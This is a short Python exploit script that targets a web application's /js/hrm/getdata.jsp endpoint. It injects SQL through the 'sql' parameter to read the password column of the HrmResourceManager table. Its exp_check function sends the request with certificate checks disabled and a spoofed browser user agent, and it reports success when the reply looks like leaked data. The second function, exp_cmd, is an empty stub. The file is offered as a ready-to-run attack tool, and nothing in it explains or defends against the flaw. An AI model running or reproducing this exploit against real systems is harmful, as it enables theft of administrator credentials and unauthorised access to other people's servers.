import sys
import requests
import urllib3
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def exp_check(url):
    target_url = url + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    try:
        urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and 'html' not in res.text:
            return 1
        else:
            return 2
    except:
        return 3

def exp_cmd(url,cmd):
        pass


